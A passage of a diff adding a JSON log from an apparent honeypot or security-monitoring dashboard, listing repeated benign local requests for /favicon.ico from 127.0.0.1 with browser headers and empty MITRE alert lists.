+      "sec-ch-ua-mobile": "?0",
+      "Accept": "image/jxl,image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8",
+      "Sec-Fetch-Site": "same-origin",
+      "Sec-Fetch-Mode": "no-cors",
+      "Sec-Fetch-Dest": "image",
+      "Referer": "http://localhost:8080/_soc",
+      "Accept-Encoding": "gzip, deflate, br, zstd",
+      "Accept-Language": "fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7,es;q=0.6"
+    },
+    "mitre_alerts": []
+  },
+  {
+    "session_id": "web-get-1794233760-51762",
+    "type": "web_probe",
+    "timestamp": "2026-11-09T14:16:00.365654+00:00",
+    "source_ip": "127.0.0.1",
+    "geo": {
+      "country": "Réseau Local / Privé",
+      "country_code": "LAN",
+      "city": "Intranet",
+      "isp": "Local Network (RFC 1918)",
+      "threat_level": "Interne"
+    },
+    "method": "GET",
+    "path": "/favicon.ico",
+    "headers": {
+      "Host": "localhost:8080",
+      "Connection": "keep-alive",
+      "sec-ch-ua-platform": "\"Windows\"",
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/157.0.0.0 Safari/537.36",
+      "sec-ch-ua": "\"Not-A.Brand\";v=\"99\", \"Google Chrome\";v=\"157\", \"Chromium\";v=\"157\"",
+      "sec-ch-ua-mobile": "?0",
+      "Accept": "image/jxl,image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8",
+      "Sec-Fetch-Site": "same-origin",
+      "Sec-Fetch-Mode": "no-cors",
+      "Sec-Fetch-Dest": "image",
+      "Referer": "http://localhost:8080/_soc",
+      "Accept-Encoding": "gzip, deflate, br, zstd",
+      "Accept-Language": "fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7,es;q=0.6"
+    },
+    "mitre_alerts": []
+  },
+  {
+    "session_id": "web-get-1794233770-51476",
+    "type": "web_probe",
+    "timestamp": "2026-11-09T14:16:10.417048+00:00",
+    "source_ip": "127.0.0.1",
+    "geo": {
+      "country": "Réseau Local / Privé",
+      "country_code": "LAN",
+      "city": "Intranet",
+      "isp": "Local Network (RFC 1918)",
+      "threat_level": "Interne"
+    },
+    "method": "GET",
+    "path": "/favicon.ico",
+    "headers": {
+      "Host": "localhost:8080",
+      "Connection": "keep-alive",
+      "sec-ch-ua-platform": "\"Windows\"",
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/157.0.0.0 Safari/537.36",
+      "sec-ch-ua": "\"Not-A.Brand\";v=\"99\", \"Google Chrome\";v=\"157\", \"Chromium\";v=\"157\"",
+      "sec-ch-ua-mobile": "?0",
+      "Accept": "image/jxl,image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8",
+      "Sec-Fetch-Site": "same-origin",
+      "Sec-Fetch-Mode": "no-cors",
+      "Sec-Fetch-Dest": "image",
+      "Referer": "http://localhost:8080/_soc",
+      "Accept-Encoding": "gzip, deflate, br, zstd",
+      "Accept-Language": "fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7,es;q=0.6"
+    },
+    "mitre_alerts": []
+  },
+  {
+    "session_id": "web-get-1794233780-57038",
+    "type": "web_probe",
+    "timestamp": "2026-11-09T14:16:20.453687+00:00",
+    "source_ip": "127.0.0.1",
+    "geo": {
+      "country": "Réseau Local / Privé",
+      "country_code": "LAN",
+      "city": "Intranet",
+      "isp": "Local Network (RFC 1918)",
+      "threat_level": "Interne"
+    },
+    "method": "GET",
+    "path": "/favicon.ico",
+    "headers": {
+      "Host": "localhost:8080",
+      "Connection": "keep-alive",
+      "sec-ch-ua-platform": "\"Windows\"",
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/157.0.0.0 Safari/537.36",
+      "sec-ch-ua": "\"Not-A.Brand\";v=\"99\", \"Google Chrome\";v=\"157\", \"Chromium\";v=\"157\"",
+      "sec-ch-ua-mobile": "?0",
+      "Accept": "image/jxl,image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8",
+      "Sec-Fetch-Site": "same-origin",
+      "Sec-Fetch-Mode": "no-cors",
+      "Sec-Fetch-Dest": "image",
+      "Referer": "http://localhost:8080/_soc",
+      "Accept-Encoding": "gzip, deflate, br, zstd",
+      "Accept-Language": "fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7,es;q=0.6"
+    },
+    "mitre_alerts": []
+  },
+  {
+    "session_id": "web-get-1794233790-51865",
+    "type": "web_probe",
+    "timestamp": "2026-11-09T14:16:30.503127+00:00",
+    "source_ip": "127.0.0.1",
+    "geo": {
+      "country": "Réseau Local / Privé",
+      "country_code": "LAN",
+      "city": "Intranet",
+      "isp": "Local Network (RFC 1918)",
+      "threat_level": "Interne"
+    },
+    "method": "GET",
+    "path": "/favicon.ico",
+    "headers": {
+      "Host": "localhost:8080",
+      "Connection": "keep-alive",
+      "sec-ch-ua-platform": "\"Windows\"",
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/157.0.0.0 Safari/537.36",
+      "sec-ch-ua": "\"Not-A.Brand\";v=\"99\", \"Google Chrome\";v=\"157\", \"Chromium\";v=\"157\"",
+      "sec-ch-ua-mobile": "?0",
+      "Accept": "image/jxl,image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8",
+      "Sec-Fetch-Site": "same-origin",
+      "Sec-Fetch-Mode": "no-cors",
+      "Sec-Fetch-Dest": "image",
+      "Referer": "http://localhost:8080/_soc",
+      "Accept-Encoding": "gzip, deflate, br, zstd",
+      "Accept-Language": "fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7,es;q=0.6"
+    },
+    "mitre_alerts": []
+  },
+  {
+    "session_id": "web-get-1794233800-63957",
+    "type": "web_probe",
+    "timestamp": "2026-11-09T14:16:40.541217+00:00",
+    "source_ip": "127.0.0.1",
+    "geo": {
+      "country": "Réseau Local / Privé",
+      "country_code": "LAN",
+      "city": "Intranet",
+      "isp": "Local Network (RFC 1918)",
+      "threat_level": "Interne"
+    },
+    "method": "GET",
+    "path": "/favicon.ico",
+    "headers": {
+      "Host": "localhost:8080",
+      "Connection": "keep-alive",
+      "sec-ch-ua-platform": "\"Windows\"",
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/157.0.0.0 Safari/537.36",
+      "sec-ch-ua": "\"Not-A.Brand\";v=\"99\", \"Google Chrome\";v=\"157\", \"Chromium\";v=\"157\"",
+      "sec-ch-ua-mobile": "?0",
+      "Accept": "image/jxl,image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8",
+      "Sec-Fetch-Site": "same-origin",
+      "Sec-Fetch-Mode": "no-cors",
+      "Sec-Fetch-Dest": "image",
+      "Referer": "http://localhost:8080/_soc",
+      "Accept-Encoding": "gzip, deflate, br, zstd",
+      "Accept-Language": "fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7,es;q=0.6"
+    },
+    "mitre_alerts": []
+  },
+  {
+    "session_id": "web-get-1794233810-64078",
+    "type": "web_probe",
+    "timestamp": "2026-11-09T14:16:50.587355+00:00",
+    "source_ip": "127.0.0.1",
+    "geo": {
+      "country": "Réseau Local / Privé",
+      "country_code": "LAN",
+      "city": "Intranet",
+      "isp": "Local Network (RFC 1918)",
+      "threat_level": "Interne"
+    },
+    "method": "GET",
+    "path": "/favicon.ico",
+    "headers": {
+      "Host": "localhost:8080",
+      "Connection": "keep-alive",
+      "sec-ch-ua-platform": "\"Windows\"",
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/157.0.0.0 Safari/537.36",
+      "sec-ch-ua": "\"Not-A.Brand\";v=\"99\", \"Google Chrome\";v=\"157\", \"Chromium\";v=\"157\"",
+      "sec-ch-ua-mobile": "?0",
+      "Accept": "image/jxl,image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8",
+      "Sec-Fetch-Site": "same-origin",
+      "Sec-Fetch-Mode": "no-cors",
+      "Sec-Fetch-Dest": "image",
+      "Referer": "http://localhost:8080/_soc",
+      "Accept-Encoding": "gzip, deflate, br, zstd",
+      "Accept-Language": "fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7,es;q=0.6"
+    },
+    "mitre_alerts": []
+  },
+  {
+    "session_id": "web-get-1794233820-51703",
+    "type": "web_probe",
+    "timestamp": "2026-11-09T14:17:00.615726+00:00",
+    "source_ip": "127.0.0.1",
+    "geo": {
+      "country": "Réseau Local / Privé",
+      "country_code": "LAN",
+      "city": "Intranet",
+      "isp": "Local Network (RFC 1918)",
+      "threat_level": "Interne"
+    },
+    "method": "GET",
+    "path": "/favicon.ico",
+    "headers": {
+      "Host": "localhost:8080",
+      "Connection": "keep-alive",
+      "sec-ch-ua-platform": "\"Windows\"",
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/157.0.0.0 Safari/537.36",
+      "sec-ch-ua": "\"Not-A.Brand\";v=\"99\", \"Google Chrome\";v=\"157\", \"Chromium\";v=\"157\"",
+      "sec-ch-ua-mobile": "?0",
+      "Accept": "image/jxl,image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8",
+      "Sec-Fetch-Site": "same-origin",
+      "Sec-Fetch-Mode": "no-cors",
+      "Sec-Fetch-Dest": "image",
+      "Referer": "http://localhost:8080/_soc",
+      "Accept-Encoding": "gzip, deflate, br, zstd",
+      "Accept-Language": "fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7,es;q=0.6"
+    },
+    "mitre_alerts": []
+  },
+  {
+    "session_id": "web-get-1794233830-51722",
+    "type": "web_probe",
+    "timestamp": "2026-11-09T14:17:10.656531+00:00",
+    "source_ip": "127.0.0.1",
+    "geo": {
+      "country": "Réseau Local / Privé",
+      "country_code": "LAN",
+      "city": "Intranet",
+      "isp": "Local Network (RFC 1918)",
+      "threat_level": "Interne"
+    },
+    "method": "GET",
+    "path": "/favicon.ico",
+    "headers": {
+      "Host": "localhost:8080",
+      "Connection": "keep-alive",
+      "sec-ch-ua-platform": "\"Windows\"",
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/157.0.0.0 Safari/537.36",
+      "sec-ch-ua": "\"Not-A.Brand\";v=\"99\", \"Google Chrome\";v=\"157\", \"Chromium\";v=\"157\"",
+      "sec-ch-ua-mobile": "?0",
+      "Accept": "image/jxl,image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8",
+      "Sec-Fetch-Site": "same-origin",
+      "Sec-Fetch-Mode": "no-cors",
+      "Sec-Fetch-Dest": "image",
+      "Referer": "http://localhost:8080/_soc",
+      "Accept-Encoding": "gzip, deflate, br, zstd",
+      "Accept-Language": "fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7,es;q=0.6"
+    },
+    "mitre_alerts": []
+  },
+  {
+    "session_id": "web-get-1794233840-58100",
+    "type": "web_probe",
+    "timestamp": "2026-11-09T14:17:20.697461+00:00",
+    "source_ip": "127.0.0.1",
+    "geo": {
+      "country": "Réseau Local / Privé",
+      "country_code": "LAN",
+      "city": "Intranet",
+      "isp": "Local Network (RFC 1918)",
+      "threat_level": "Interne"
+    },
+    "method": "GET",
+    "path": "/favicon.ico",
+    "headers": {
+      "Host": "localhost:8080",
+      "Connection": "keep-alive",
+      "sec-ch-ua-platform": "\"Windows\"",
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/157.0.0.0 Safari/537.36",
+      "sec-ch-ua": "\"Not-A.Brand\";v=\"99\", \"Google Chrome\";v=\"157\", \"Chromium\";v=\"157\"",
+      "sec-ch-ua-mobile": "?0",
+      "Accept": "image/jxl,image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8",
+      "Sec-Fetch-Site": "same-origin",
+      "Sec-Fetch-Mode": "no-cors",
+      "Sec-Fetch-Dest": "image",
+      "Referer": "http://localhost:8080/_soc",
+      "Accept-Encoding": "gzip, deflate, br, zstd",
+      "Accept-Language": "fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7,es;q=0.6"
+    },
+    "mitre_alerts": []
+  },
+  {
+    "session_id": "web-get-1794233850-62647",
+    "type": "web_probe",
+    "timestamp": "2026-11-09T14:17:30.738238+00:00",
+    "source_ip": "127.0.0.1",
+    "geo": {
+      "country": "Réseau Local / Privé",
+      "country_code": "LAN",
+      "city": "Intranet",
+      "isp": "Local Network (RFC 1918)",
+      "threat_level": "Interne"
+    },
+    "method": "GET",
+    "path": "/favicon.ico",
+    "headers": {
+      "Host": "localhost:8080",
+      "Connection": "keep-alive",
+      "sec-ch-ua-platform": "\"Windows\"",
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/157.0.0.0 Safari/537.36",
+      "sec-ch-ua": "\"Not-A.Brand\";v=\"99\", \"Google Chrome\";v=\"157\", \"Chromium\";v=\"157\"",
+      "sec-ch-ua-mobile": "?0",
+      "Accept": "image/jxl,image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8",
+      "Sec-Fetch-Site": "same-origin",
+      "Sec-Fetch-Mode": "no-cors",
+      "Sec-Fetch-Dest": "image",
+      "Referer": "http://localhost:8080/_soc",
+      "Accept-Encoding": "gzip, deflate, br, zstd",
+      "Accept-Language": "fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7,es;q=0.6"
+    },
+    "mitre_alerts": []
+  },
+  {
+    "session_id": "web-get-1794233860-60486",
+    "type": "web_probe",
+    "timestamp": "2026-11-09T14:17:40.780779+00:00",
+    "source_ip": "127.0.0.1",
+    "geo": {
+      "country": "Réseau Local / Privé",
+      "country_code": "LAN",
+      "city": "Intranet",
+      "isp": "Local Network (RFC 1918)",
+      "threat_level": "Interne"
+    },
+    "method": "GET",
+    "path": "/favicon.ico",
+    "headers": {
+      "Host": "localhost:8080",
+      "Connection": "keep-alive",
+      "sec-ch-ua-platform": "\"Windows\"",
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/157.0.0.0 Safari/537.36",
+      "sec-ch-ua": "\"Not-A.Brand\";v=\"99\", \"Google Chrome\";v=\"157\", \"Chromium\";v=\"157\"",
+      "sec-ch-ua-mobile": "?0",
+      "Accept": "image/jxl,image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8",
+      "Sec-Fetch-Site": "same-origin",
+      "Sec-Fetch-Mode": "no-cors",
+      "Sec-Fetch-Dest": "image",
+      "Referer": "http://localhost:8080/_soc",
+      "Accept-Encoding": "gzip, deflate, br, zstd",
+      "Accept-Language": "fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7,es;q=0.6"
+    },
+    "mitre_alerts": []
+  },
+  {
+    "session_id": "web-get-1794233870-57165",
+    "type": "web_probe",
+    "timestamp": "2026-11-09T14:17:50.810959+00:00",
+    "source_ip": "127.0.0.1",
+    "geo": {
+      "country": "Réseau Local / Privé",
+      "country_code": "LAN",
+      "city": "Intranet",
+      "isp": "Local Network (RFC 1918)",
+      "threat_level": "Interne"
+    },
+    "method": "GET",
+    "path": "/favicon.ico",
+    "headers": {
+      "Host": "localhost:8080",
+      "Connection": "keep-alive",
+      "sec-ch-ua-platform": "\"Windows\"",
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/157.0.0.0 Safari/537.36",
+      "sec-ch-ua": "\"Not-A.Brand\";v=\"99\", \"Google Chrome\";v=\"157\", \"Chromium\";v=\"157\"",
+      "sec-ch-ua-mobile": "?0",
+      "Accept": "image/jxl,image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8",
+      "Sec-Fetch-Site": "same-origin",
+      "Sec-Fetch-Mode": "no-cors",
+      "Sec-Fetch-Dest": "image",
+      "Referer": "http://localhost:8080/_soc",
+      "Accept-Encoding": "gzip, deflate, br, zstd",
+      "Accept-Language": "fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7,es;q=0.6"
+    },
+    "mitre_alerts": []
+  },
+  {
+    "session_id": "web-get-1794233880-51158",
+    "type": "web_probe",
+    "timestamp": "2026-11-09T14:18:00.853262+00:00",
+    "source_ip": "127.0.0.1",
+    "geo": {
+      "country": "Réseau Local / Privé",
+      "country_code": "LAN",
+      "city": "Intranet",
+      "isp": "Local Network (RFC 1918)",
+      "threat_level": "Interne"
+    },
+    "method": "GET",
+    "path": "/favicon.ico",
+    "headers": {
+      "Host": "localhost:8080",
+      "Connection": "keep-alive",
+      "sec-ch-ua-platform": "\"Windows\"",
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/157.0.0.0 Safari/537.36",
+      "sec-ch-ua": "\"Not-A.Brand\";v=\"99\", \"Google Chrome\";v=\"157\", \"Chromium\";v=\"157\"",
+      "sec-ch-ua-mobile": "?0",
+      "Accept": "image/jxl,image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8",
+      "Sec-Fetch-Site": "same-origin",
+      "Sec-Fetch-Mode": "no-cors",
+      "Sec-Fetch-Dest": "image",
+      "Referer": "http://localhost:8080/_soc",
+      "Accept-Encoding": "gzip, deflate, br, zstd",
+      "Accept-Language": "fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7,es;q=0.6"
+    },
+    "mitre_alerts": []
+  },
+  {
+    "session_id": "web-get-1794233890-53600",
+    "type": "web_probe",
+    "timestamp": "2026-11-09T14:18:10.896079+00:00",
+    "source_ip": "127.0.0.1",
+    "geo": {
+      "country": "Réseau Local / Privé",
+      "country_code": "LAN",
+      "city": "Intranet",
+      "isp": "Local Network (RFC 1918)",
+      "threat_level": "Interne"
+    },
+    "method": "GET",
+    "path": "/favicon.ico",
+    "headers": {
+      "Host": "localhost:8080",
+      "Connection": "keep-alive",
+      "sec-ch-ua-platform": "\"Windows\"",
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/157.0.0.0 Safari/537.36",
+      "sec-ch-ua": "\"Not-A.Brand\";v=\"99\", \"Google Chrome\";v=\"157\", \"Chromium\";v=\"157\"",
+      "sec-ch-ua-mobile": "?0",
+      "Accept": "image/jxl,image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8",
+      "Sec-Fetch-Site": "same-origin",
+      "Sec-Fetch-Mode": "no-cors",
+      "Sec-Fetch-Dest": "image",
+      "Referer": "http://localhost:8080/_soc",
+      "Accept-Encoding": "gzip, deflate, br, zstd",
+      "Accept-Language": "fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7,es;q=0.6"
+    },
+    "mitre_alerts": []
+  },
+  {
+    "session_id": "web-get-1794233900-51393",
+    "type": "web_probe",
+    "timestamp": "2026-11-09T14:18:20.938331+00:00",
+    "source_ip": "127.0.0.1",
+    "geo": {
+      "country": "Réseau Local / Privé",
+      "country_code": "LAN",
+      "city": "Intranet",
+      "isp": "Local Network (RFC 1918)",
+      "threat_level": "Interne"
+    },
+    "method": "GET",
+    "path": "/favicon.ico",
+    "headers": {
+      "Host": "localhost:8080",
+      "Connection": "keep-alive",
+      "sec-ch-ua-platform": "\"Windows\"",
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/157.0.0.0 Safari/537.36",
+      "sec-ch-ua": "\"Not-A.Brand\";v=\"99\", \"Google Chrome\";v=\"157\", \"Chromium\";v=\"157\"",
+      "sec-ch-ua-mobile": "?0",
+      "Accept": "image/jxl,image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8",
+      "Sec-Fetch-Site": "same-origin",
+      "Sec-Fetch-Mode": "no-cors",
+      "Sec-Fetch-Dest": "image",
+      "Referer": "http://localhost:8080/_soc",
+      "Accept-Encoding": "gzip, deflate, br, zstd",
+      "Accept-Language": "fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7,es;q=0.6"
+    },
+    "mitre_alerts": []
+  },
+  {
+    "session_id": "web-get-1794233910-59539",
+    "type": "web_probe",
+    "timestamp": "2026-11-09T14:18:30.977086+00:00",
+    "source_ip": "127.0.0.1",
+    "geo": {
+      "country": "Réseau Local / Privé",
+      "country_code": "LAN",
+      "city": "Intranet",
+      "isp": "Local Network (RFC 1918)",
+      "threat_level": "Interne"
+    },
+    "method": "GET",
+    "path": "/favicon.ico",
+    "headers": {
+      "Host": "localhost:8080",
+      "Connection": "keep-alive",
+      "sec-ch-ua-platform": "\"Windows\"",
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/157.0.0.0 Safari/537.36",
+      "sec-ch-ua": "\"Not-A.Brand\";v=\"99\", \"Google Chrome\";v=\"157\", \"Chromium\";v=\"157\"",
+      "sec-ch-ua-mobile": "?0",
+      "Accept": "image/jxl,image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8",
+      "Sec-Fetch-Site": "same-origin",
+      "Sec-Fetch-Mode": "no-cors",
+      "Sec-Fetch-Dest": "image",
+      "Referer": "http://localhost:8080/_soc",
+      "Accept-Encoding": "gzip, deflate, br, zstd",
+      "Accept-Language": "fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7,es;q=0.6"
+    },
+    "mitre_alerts": []
+  },
+  {
+    "session_id": "web-get-1794233921-58880",
+    "type": "web_probe",
+    "timestamp": "2026-11-09T14:18:41.012673+00:00",
+    "source_ip": "127.0.0.1",
+    "geo": {
+      "country": "Réseau Local / Privé",
+      "country_code": "LAN",
+      "city": "Intranet",
+      "isp": "Local Network (RFC 1918)",
+      "threat_level": "Interne"
+    },
+    "method": "GET",
+    "path": "/favicon.ico",
+    "headers": {
+      "Host": "localhost:8080",
+      "Connection": "keep-alive",
+      "sec-ch-ua-platform": "\"Windows\"",
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/157.0.0.0 Safari/537.36",
+      "sec-ch-ua": "\"Not-A.Brand\";v=\"99\", \"Google Chrome\";v=\"157\", \"Chromium\";v=\"157\"",
+      "sec-ch-ua-mobile": "?0",
+      "Accept": "image/jxl,image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8",
+      "Sec-Fetch-Site": "same-origin",
+      "Sec-Fetch-Mode": "no-cors",
+      "Sec-Fetch-Dest": "image",
+      "Referer": "http://localhost:8080/_soc",
+      "Accept-Encoding": "gzip, deflate, br, zstd",
+      "Accept-Language": "fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7,es;q=0.6"
+    },
+    "mitre_alerts": []
+  },
+  {
+    "session_id": "web-get-1794233931-62533",
+    "type": "web_probe",
+    "timestamp": "2026-11-09T14:18:51.059053+00:00",
+    "source_ip": "127.0.0.1",
+    "geo": {
+      "country": "Réseau Local / Privé",
+      "country_code": "LAN",
+      "city": "Intranet",
+      "isp": "Local Network (RFC 1918)",
+      "threat_level": "Interne"
+    },
+    "method": "GET",
+    "path": "/favicon.ico",
+    "headers": {
+      "Host": "localhost:8080",
+      "Connection": "keep-alive",
+      "sec-ch-ua-platform": "\"Windows\"",
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/157.0.0.0 Safari/537.36",
+      "sec-ch-ua": "\"Not-A.Brand\";v=\"99\", \"Google Chrome\";v=\"157\", \"Chromium\";v=\"157\"",
+      "sec-ch-ua-mobile": "?0",
+      "Accept": "image/jxl,image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8",
+      "Sec-Fetch-Site": "same-origin",
+      "Sec-Fetch-Mode": "no-cors",
+      "Sec-Fetch-Dest": "image",
+      "Referer": "http://localhost:8080/_soc",
+      "Accept-Encoding": "gzip, deflate, br, zstd",
+      "Accept-Language": "fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7,es;q=0.6"
+    },
+    "mitre_alerts": []
+  },
+  {
+    "session_id": "web-get-1794233941-49672",
+    "type": "web_probe",
+    "timestamp": "2026-11-09T14:19:01.100880+00:00",
+    "source_ip": "127.0.0.1",
+    "geo": {
+      "country": "Réseau Local / Privé",
+      "country_code": "LAN",
+      "city": "Intranet",
+      "isp": "Local Network (RFC 1918)",
+      "threat_level": "Interne"
+    },
+    "method": "GET",
+    "path": "/favicon.ico",
+    "headers": {
+      "Host": "localhost:8080",
+      "Connection": "keep-alive",
+      "sec-ch-ua-platform": "\"Windows\"",
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/157.0.0.0 Safari/537.36",
+      "sec-ch-ua": "\"Not-A.Brand\";v=\"99\", \"Google Chrome\";v=\"157\", \"Chromium\";v=\"157\"",
+      "sec-ch-ua-mobile": "?0",
+      "Accept": "image/jxl,image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8",
+      "Sec-Fetch-Site": "same-origin",
+      "Sec-Fetch-Mode": "no-cors",
+      "Sec-Fetch-Dest": "image",
+      "Referer": "http://localhost:8080/_soc",
+      "Accept-Encoding": "gzip, deflate, br, zstd",
+      "Accept-Language": "fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7,es;q=0.6"
+    },
+    "mitre_alerts": []
+  },
+  {
+    "session_id": "web-get-1794233951-60620",
+    "type": "web_probe",
+    "timestamp": "2026-11-09T14:19:11.131727+00:00",
+    "source_ip": "127.0.0.1",
+    "geo": {
+      "country": "Réseau Local / Privé",
+      "country_code": "LAN",
+      "city": "Intranet",
+      "isp": "Local Network (RFC 1918)",
+      "threat_level": "Interne"
+    },
+    "method": "GET",
+    "path": "/favicon.ico",
+    "headers": {
+      "Host": "localhost:8080",
+      "Connection": "keep-alive",
+      "sec-ch-ua-platform": "\"Windows\"",
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/157.0.0.0 Safari/537.36",
+      "sec-ch-ua": "\"Not-A.Brand\";v=\"99\", \"Google Chrome\";v=\"157\", \"Chromium\";v=\"157\"",
+      "sec-ch-ua-mobile": "?0",
+      "Accept": "image/jxl,image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8",
+      "Sec-Fetch-Site": "same-origin",
+      "Sec-Fetch-Mode": "no-cors",
+      "Sec-Fetch-Dest": "image",
+      "Referer": "http://localhost:8080/_soc",
+      "Accept-Encoding": "gzip, deflate, br, zstd",
+      "Accept-Language": "fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7,es;q=0.6"
+    },
+    "mitre_alerts": []
+  },
+  {
+    "session_id": "web-get-1794233961-50708",
+    "type": "web_probe",
+    "timestamp": "2026-11-09T14:19:21.180817+00:00",
+    "source_ip": "127.0.0.1",
+    "geo": {
+      "country": "Réseau Local / Privé",
+      "country_code": "LAN",
+      "city": "Intranet",
+      "isp": "Local Network (RFC 1918)",
+      "threat_level": "Interne"
+    },
+    "method": "GET",
+    "path": "/favicon.ico",
+    "headers": {
+      "Host": "localhost:8080",
+      "Connection": "keep-alive",
+      "sec-ch-ua-platform": "\"Windows\"",
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/157.0.0.0 Safari/537.36",
+      "sec-ch-ua": "\"Not-A.Brand\";v=\"99\", \"Google Chrome\";v=\"157\", \"Chromium\";v=\"157\"",
+      "sec-ch-ua-mobile": "?0",
+      "Accept": "image/jxl,image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8",
+      "Sec-Fetch-Site": "same-origin",
+      "Sec-Fetch-Mode": "no-cors",
+      "Sec-Fetch-Dest": "image",
+      "Referer": "http://localhost:8080/_soc",
+      "Accept-Encoding": "gzip, deflate, br, zstd",
+      "Accept-Language": "fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7,es;q=0.6"
+    },
+    "mitre_alerts": []
+  },
+  {
+    "session_id": "web-get-1794233971-61658",
+    "type": "web_probe",
+    "timestamp": "2026-11-09T14:19:31.229393+00:00",
+    "source_ip": "127.0.0.1",
+    "geo": {
+      "country": "Réseau Local / Privé",
+      "country_code": "LAN",
+      "city": "Intranet",
+      "isp": "Local Network (RFC 1918)",
+      "threat_level": "Interne"
+    },
+    "method": "GET",
+    "path": "/favicon.ico",
+    "headers": {
+      "Host": "localhost:8080",
+      "Connection": "keep-alive",
+      "sec-ch-ua-platform": "\"Windows\"",
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/157.0.0.0 Safari/537.36",
+      "sec-ch-ua": "\"Not-A.Brand\";v=\"99\", \"Google Chrome\";v=\"157\", \"Chromium\";v=\"157\"",
+      "sec-ch-ua-mobile": "?0",
+      "Accept": "image/jxl,image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8",
+      "Sec-Fetch-Site": "same-origin",
+      "Sec-Fetch-Mode": "no-cors",
+      "Sec-Fetch-Dest": "image",
